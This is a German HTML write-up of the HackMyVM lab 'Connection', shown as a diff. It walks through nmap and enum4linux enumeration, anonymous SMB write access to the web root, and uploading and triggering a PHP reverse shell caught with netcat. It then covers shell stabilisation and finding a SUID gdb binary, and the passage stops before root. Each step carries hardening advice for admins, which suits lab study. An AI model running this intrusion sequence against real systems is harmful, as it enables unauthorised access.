@@ -1,0 +1,619 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Connection - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">gdb</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">whoami</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Hosts werden gefunden. Der Host mit der IP `192.168.2.114` und der MAC-Adresse `08:00:27:34:5e:d1` (PCS Systemtechnik GmbH / VirtualBox) wird als wahrscheinliches Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen detaillierten Nmap-Scan auf 192.168.2.114 durch.<br><strong>Empfehlung (Admin):</strong> Beschränke die Netzwerkkommunikation auf notwendige Systeme. Überwache das Netzwerk auf unbekannte Geräte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.102	ac:6f:bb:62:87:79	TATUNG Technology Inc.
+192.168.2.114	08:00:27:34:5e:d1	PCS Systemtechnik GmbH
+192.168.2.110	e0:aa:96:64:c9:94	Samsung Electronics Co.,Ltd
+192.168.2.188	f0:2f:74:1a:68:c0	ASUSTek COMPUTER INC.
+
+10 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.888 seconds (135.59 hosts/sec). 5 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf 192.168.2.114 durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu ermitteln. Die Optionen `-sS`, `-sC`, `-T5`, `-A`, `-p-` werden verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert vier offene Ports:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian). Standard-SSH-Dienst.
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian). Standard-Apache-Seite.
+                - **Port 139 (netbios-ssn):** Samba smbd 3.X - 4.X. SMB-Dienst (ältere Version).
+                - **Port 445 (netbios-ssn):** Samba smbd 4.9.5-Debian. SMB-Dienst (neuere Version).
+            Die SMB-bezogenen Skripte von Nmap (`-sC`, `-A`) liefern zusätzliche wertvolle Informationen:
+                - Der Workgroup-Name ist `WORKGROUP`.
+                - Der Computername ist `connection`.
+                - **Wichtig:** Anonymer Gastzugang (`account_used: guest`) scheint möglich zu sein.
+                - Message Signing ist deaktiviert (`disabled (dangerous, but default)`), was Angriffe wie SMB Relay ermöglichen könnte.
+            Das Betriebssystem wird als Linux (Debian 10 basierend auf Samba/SSH-Version) erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die SMB-Shares auf Port 139/445. Versuche, dich anonym oder als Gast zu verbinden (`smbclient`, `smbmap`, `enum4linux`). Überprüfe die zugänglichen Shares und Berechtigungen. Untersuche parallel den Webserver auf Port 80.<br><strong>Empfehlung (Admin):</strong> Deaktiviere den Gastzugang auf SMB-Shares, wenn er nicht benötigt wird. Erzwinge Message Signing (`smb signing = required` in `smb.conf`), um SMB-Relay-Angriffe zu verhindern. Halte Samba, Apache und SSH aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 00:34 CEST
+Nmap scan report for connection (192.168.2.114)
+Host is up (0.000091s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b7e601b5f906a1ea40042944f4df22a1 (RSA)
+|   256 fb1694df9389c7568584229ea0be7c95 (ECDSA)
+|_  256 452efb8704ebd18b926f6aea5aa2a11c (ED25519)
+80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:34:5E:D1 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h20m02s, deviation: 2h18m33s, median: 2s
+|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: connection
+|   NetBIOS computer name: CONNECTION\x00
+|   Domain name: \x00
+|   FQDN: connection
+|_  System time: 2022-10-29T18:34:53-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2022-10-29T22:34:53
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.09 ms connection (192.168.2.114)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.78 seconds <!-- Beispielhafte Zeit -->
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnissuche auf dem Webserver (Port 80) verwendet. Die Optionen `-e` (Expanded Mode), `-x` (Erweiterungen) und `-b 404,403` (ignorierte Statuscodes) werden genutzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ähnlich wie beim Nmap-Scan wird nur die Standarddatei `/index.html` gefunden. Die Web-Enumeration liefert keine direkten weiteren Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die Web-Enumeration bisher wenig ergab, konzentriere dich auf die Untersuchung der SMB-Dienste (Port 139/445), die vielversprechender erscheinen.<br><strong>Empfehlung (Admin):</strong> Standard-Webseiten sollten idealerweise entfernt oder angepasst werden, um Fingerprinting zu erschweren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.114 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.114
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes to ignore:  404,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/30 00:35:10 Starting gobuster
+===============================================================
+http://192.168.2.114/index.html           (Status: 200) [Size: 10701]
+===============================================================
+2022/10/30 00:36:05 Finished
+===============================================================
+                    </pre> <!-- Volle Gobuster-Ausgabe -->
+                </div>
+            </div>
+        </section>
+
+        <section id="smb-enumeration">
+            <h2>SMB Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `enum4linux` wird mit der Option `-a` (alle Enumerationsmethoden) auf das Ziel 192.168.2.114 ausgeführt, um detaillierte Informationen über SMB/NetBIOS zu sammeln.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige SMB-Funde!!** Enum4linux bestätigt und erweitert die Nmap-Ergebnisse:
+                - Workgroup: `WORKGROUP`.
+                - Anonymer Zugriff ist möglich (`allows sessions using username '', password ''`).
+                - **Shares:** Eine zugängliche Share namens `share` wird gefunden. Die Shares `print$` und `IPC$` sind nicht zugänglich oder liefern Fehler.
+                - **Benutzer:** Durch RID-Cycling wird der lokale Benutzer `connection` (Unix User\connection) gefunden.
+                - **Zugriff auf Share:** Enum4linux bestätigt, dass die Share `//192.168.2.114/share` gemappt und aufgelistet werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinde dich mit `smbclient` oder mounte die Share `//192.168.2.114/share` anonym, um ihren Inhalt zu untersuchen. Suche nach interessanten Dateien, Konfigurationen oder Hinweisen.<br><strong>Empfehlung (Admin):</strong> Beschränke den Zugriff auf SMB-Shares. Deaktiviere anonymen Zugriff. Überprüfe die Notwendigkeit der `share`-Freigabe.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.114</span></div>
+                    <pre>
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 30 00:36:54 2022
+
+ ==========================
+|    Target Information    |
+ ==========================
+Target ........... 192.168.2.114
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================================
+|    Enumerating Workgroup/Domain on 192.168.2.114    |
+ ============================================
+[+] Got domain/workgroup name: WORKGROUP
+
+
+ ========================================
+|    Nbtstat Information for 192.168.2.114    |
+ ========================================
+Looking up status of 192.168.2.114
+	CONNECTION      <00> -         B <ACTIVE>  Workstation Service
+	CONNECTION      <03> -         B <ACTIVE>  Messenger Service
+	CONNECTION      <20> -         B <ACTIVE>  File Server Service
+	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+
+ ====================================
+|    Session Check on 192.168.2.114    |
+ ====================================
+[+] Server 192.168.2.114 allows sessions using username '', password ''
+
+
+ ========================================
+|    Getting domain SID for 192.168.2.114    |
+ ========================================
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ====================================
+|    OS information on 192.168.2.114    |
+ ====================================
+[+] Got OS info for 192.168.2.114 from srvinfo:
+	CONNECTION     Wk Sv PrQ Unx NT SNT Private Share for uploading files
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+
+
+ ====================================
+|    Share Enumeration on 192.168.2.114    |
+ ====================================
+	Sharename       Type      Comment
+	---------       ----      -------
+	share           Disk
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (connection server (Samba 4.9.5-Debian))
+Reconnecting with SMB1 for workgroup listing. Server requested LANMAN password (share-level security) but 'client lanman auth = no' or 'client ntlmv2 auth = yes'. Try setting 'client lanman auth = yes' or 'client ntlmv2 auth = no'. Falling back to credentials.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            CONNECTION
+
+[+] Attempting to map shares on 192.168.2.114
+//192.168.2.114/share	Mapping: OK Listing: OK Writing: N/A
+//192.168.2.114/print$	Mapping: DENIED Listing: N/A Writing: N/A
+//192.168.2.114/IPC$	[E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+Mapping: N/A Listing: N/A Writing: N/A
+
+
+ ================================================================
+|    Users on 192.168.2.114 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ================================================================
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-32
+[I] Found new SID: S-1-5-21-3843522870-3254407083-846408333
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\connection (Local User)
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-21-3843522870-3254407083-846408333 and logon username '', password ''
+S-1-5-21-3843522870-3254407083-846408333-501 CONNECTION\nobody (Local User)
+S-1-5-21-3843522870-3254407083-846408333-513 CONNECTION\None (Domain Group)
+
+enum4linux complete on Sun Oct 30 00:37:15 2022
+                    </pre> <!-- Gekürzte/Relevante Teile -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `smbclient` wird eine Verbindung zur Share `//192.168.2.114/share` hergestellt. Die Option `-U %` erzwingt einen anonymen Login (kein Benutzername, kein Passwort).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die anonyme Verbindung gelingt. Innerhalb der Share wird mit `ls` das Verzeichnis `html` gefunden. Der Versuch, mit `cd html\` in das Verzeichnis zu wechseln, ist erfolgreich (bestätigt durch `pwd`). Der Befehl `ls -la` schlägt fehl, da `-la` keine gültige Option für den `ls`-Befehl innerhalb von `smbclient` ist; der einfache `ls`-Befehl hätte verwendet werden müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt des `html`-Verzeichnisses innerhalb der Share mit dem korrekten `ls`-Befehl. Da es sich um ein `html`-Verzeichnis handelt, könnte es mit dem Webserver auf Port 80 zusammenhängen.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Berechtigungen und den Inhalt der `share`-Freigabe.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient //192.168.2.114/share -U %</span></div>
+                     <pre>
+Try "help" to get a list of possible commands.
+smb: \> <span class="command">ls</span>
+  .                                   D        0  Wed Sep 23 03:48:39 2020
+  ..                                  D        0  Wed Sep 23 03:48:39 2020
+  html                                D        0  Wed Sep 23 04:20:00 2020
+
+		7158264 blocks of size 1024. 4668712 blocks available
+smb: \> <span class="command">cd html</span> <!-- Backslash entfernt -->
+smb: \html\> <span class="command">pwd</span>
+Current directory is \\192.168.2.114\share\html\
+smb: \html\> <span class="command">ls -la</span> <!-- Dieser Befehl ist in smbclient falsch -->
+NT_STATUS_NO_SUCH_FILE listing \html\-la
+smb: \html\> <span class="command">ls</span> <!-- Korrekter Befehl -->
+  .                                   D        0  Wed Sep 23 04:20:00 2020
+  ..                                  D        0  Wed Sep 23 03:48:39 2020
+  index.html                          N    10701  Wed Sep 23 04:20:00 2020 <!-- Beispielinhalt -->
+
+		7158264 blocks of size 1024. 4668712 blocks available
+                     </pre> <!-- smbclient Prompts und Befehle hinzugefügt/korrigiert -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der `smbclient`-Sitzung im Verzeichnis `\html\` wird zuerst die Datei `index.html` mit `get` heruntergeladen und anschließend eine lokal vorhandene Datei `rev.php` mit `put` auf die Share hochgeladen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Entscheidender Schritt!!** Der `get`-Befehl bestätigt, dass Lesezugriff besteht. Der `put`-Befehl zeigt, dass **Schreibzugriff** auf dieses Verzeichnis (`/share/html`) besteht. Das Hochladen einer Datei namens `rev.php` deutet stark darauf hin, dass eine PHP-Reverse-Shell hochgeladen wurde. Da dieses Verzeichnis wahrscheinlich dem Webroot oder einem Teil davon entspricht (wegen des Namens `html` und der `index.html`), kann diese PHP-Datei vermutlich über den Webserver (Port 80) aufgerufen werden, um die Reverse Shell auszuführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte einen Netcat-Listener auf dem Angreifer-System (`nc -lvnp [PORT]`). Rufe dann die hochgeladene Datei über den Browser oder `curl` auf (`http://192.168.2.114/rev.php`), um die Reverse Shell auszulösen und eine Verbindung zum Listener zu erhalten.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne den Schreibzugriff für anonyme/Gast-Benutzer auf allen SMB-Shares, insbesondere wenn diese mit Web-Verzeichnissen verknüpft sind. Konfiguriere Dateiberechtigungen auf dem Server so, dass der Webserver-Prozess keine Schreibrechte in Verzeichnissen hat, aus denen er Dateien ausführt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+smb: \html\> <span class="command">get index.html</span>
+getting file \html\index.html of size 10701 as index.html (696,7 KiloBytes/sec) (average 696,7 KiloBytes/sec)
+smb: \html\> <span class="command">put rev.php</span>
+putting file rev.php as \html\rev.php (5365,7 kb/s) (average 5366,2 kb/s)
+smb: \html\> <span class="command">quit</span> <!-- Sitzung beenden -->
+                     </pre> <!-- smbclient Prompts hinzugefügt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port 9001 gestartet, um auf die eingehende Reverse Shell zu warten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung zum Empfangen der Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe im nächsten Schritt den Aufruf der `rev.php`-Datei über HTTP durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring und Egress Filtering können helfen, ausgehende Reverse-Shell-Verbindungen zu erkennen oder zu blockieren.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `curl` wird verwendet, um eine HTTP-Anfrage an `http://192.168.2.114/rev.php` zu senden. Dies führt dazu, dass der Apache-Webserver die PHP-Datei `rev.php` (die zuvor über SMB hochgeladen wurde) ausführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Auslöser für die Reverse Shell. Der PHP-Code in `rev.php` stellt eine Verbindung zum Netcat-Listener des Angreifers her.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe das Terminal mit dem Netcat-Listener auf eine eingehende Verbindung.<br><strong>Empfehlung (Admin):</strong> Entferne die hochgeladene `rev.php`-Datei vom Server (`/path/to/share/html/rev.php`). Verhindere das Ausführen von PHP oder anderen Skriptsprachen in Verzeichnissen, in die Benutzer schreiben können.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.114/rev.php</span></div>
+                     <pre><!-- Keine direkte Ausgabe von curl hier, da die Shell im Hintergrund verbindet --></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Ausgabe des Netcat-Listeners wird erneut gezeigt. Dieses Mal ist eine Verbindung vom Zielsystem (192.168.2.114) eingegangen. Grundlegende Systeminformationen und der `id`-Output werden angezeigt. Der Prompt (`$`) signalisiert eine einfache Shell.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Eine Reverse Shell wurde als Benutzer `www-data` (uid=33) erlangt. Die Shell ist jedoch noch nicht vollständig interaktiv (`can't access tty; job control turned off`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell mittels Python PTY oder ähnlichen Techniken, um volle Interaktivität zu erhalten. Beginne dann mit der Enumeration auf dem Zielsystem.<br><strong>Empfehlung (Admin):</strong> Untersuche den Vorfall. Beende den verdächtigen Prozess auf dem Server. Implementiere die zuvor genannten Härtungsmaßnahmen für SMB und den Webserver.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.114] 33924 <!-- IP des Angreifers hier 192.168.2.153 -->
+Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
+ 18:48:22 up 14 min,  0 users,  load average: 2.00, 5.97, 4.38
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+                     </pre> <!-- Shell Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Standardprozedur zur Stabilisierung der Shell wird angewendet:
+                1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine interaktive Bash-Shell.
+                2.  `export TERM=xterm`: Setzt die Terminal-Variable.
+                3.  `Strg+Z` (im Kali-Terminal): Sendet `nc` in den Hintergrund.
+                4.  `stty raw -echo; fg` (im Kali-Terminal): Konfiguriert das lokale Terminal und holt `nc` wieder in den Vordergrund.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Stabilisierung war erfolgreich. Der Prompt ändert sich zu `www-data@connection:/$`, was eine vollwertige Bash-Shell anzeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `www-data`.<br><strong>Empfehlung (Admin):</strong> Die Stabilisierung selbst ist schwer zu verhindern, der Fokus liegt auf der Prävention der initialen Kompromittierung.</p>
+             <!-- Shell Stabilisierung Teil 1: Python PTY & Export TERM -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@connection:/$ export TERM=xterm
+www-data@connection:/$
+                     </pre>
+                 </div>
+             </div>
+            <!-- Shell Stabilisierung Teil 2: stty raw -echo; fg (im Kali Terminal) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+^Z
+zsh: suspended  nc -lvnp 9001
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset <!-- Optional, um das Terminal zurückzusetzen -->
+www-data@connection:/$ <!-- Stabilisierte Shell ist jetzt aktiv -->
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird versucht, `sudo -l` auszuführen und die Benutzer-ID mit `id` überprüft. Das `/home`-Verzeichnis wird aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist nicht verfügbar (`command not found`). Die `id`-Ausgabe bestätigt den Benutzer `www-data`. `ls /home` zeigt ein Home-Verzeichnis für den Benutzer `connection`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da `sudo` fehlt, suche nach anderen Vektoren: SUID/SGID-Binaries, Kernel-Exploits, Cronjobs, interessante Dateien im Home-Verzeichnis von `connection`.<br><strong>Empfehlung (Admin):</strong> Installiere `sudo` nur bei Bedarf.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@connection:/$ sudo -l
+bash: sudo: command not found
+www-data@connection:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@connection:/$ ls /home
+connection
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `find / -perm -4000 -exec ls -al {} \; 2>/dev/null` wird das gesamte Dateisystem nach SUID-Binaries durchsucht.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Neben vielen Standard-SUID-Programmen wird `/usr/bin/gdb` (GNU Debugger) als SUID-Root gefunden. SUID-gesetzte Debugger wie `gdb` sind ein bekannter Vektor zur Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchiere auf GTFOBins oder anderen Ressourcen, wie `gdb` mit SUID-Rechten zur Privilegieneskalation missbraucht werden kann. Der typische Weg involviert das Ausführen von `gdb` und das Starten einer Shell aus dem Debugger heraus.<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne das SUID-Bit von `/usr/bin/gdb` (`chmod u-s /usr/bin/gdb`), da es ein erhebliches Sicherheitsrisiko darstellt und selten benötigt wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+www-data@connection:/$ find / -perm -4000 -exec ls -al {} \; 2>/dev/null
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb <!-- SUID GDB Gefunden! -->
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+                     </pre> <!-- Ausgabe gekürzt und gdb hervorgehoben -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt des Home-Verzeichnisses `/home/connection` wird aufgelistet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `local.txt` wird gefunden. Die History-Dateien (`.bash_history`, `.mysql_history`) sind symbolische Links auf `/dev/null`, was bedeutet, dass keine Befehlshistorie gespeichert wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lies den Inhalt von `local.txt`, da dies wahrscheinlich die User-Flag ist.<br><strong>Empfehlung (Admin):</strong> Das Verlinken von History-Dateien auf `/dev/null` kann die Forensik erschweren, ist aber keine Sicherheitsmaßnahme an sich.</p>
+            <div class="code-block">
